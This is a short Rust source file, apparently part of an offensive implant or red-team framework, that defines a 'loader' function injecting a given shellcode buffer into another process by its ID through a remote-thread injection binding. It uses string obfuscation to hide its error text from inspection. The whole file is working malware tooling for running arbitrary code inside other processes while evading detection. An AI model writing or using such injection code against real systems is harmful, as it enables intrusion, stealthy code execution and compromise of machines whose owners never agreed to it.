use crate::kit::binding::InjectRemoteThread;
use malefic_gateway::obfstr::obfstr;

pub unsafe fn loader(bin: Vec<u8>, pid: u32) -> Result<String, String> {
    if bin.is_empty() {
        return Err(obfstr!("empty shellcode").to_string());
    }
    let ret = InjectRemoteThread(bin.as_ptr(), bin.len(), pid);
    Ok(ret.into_string())
}
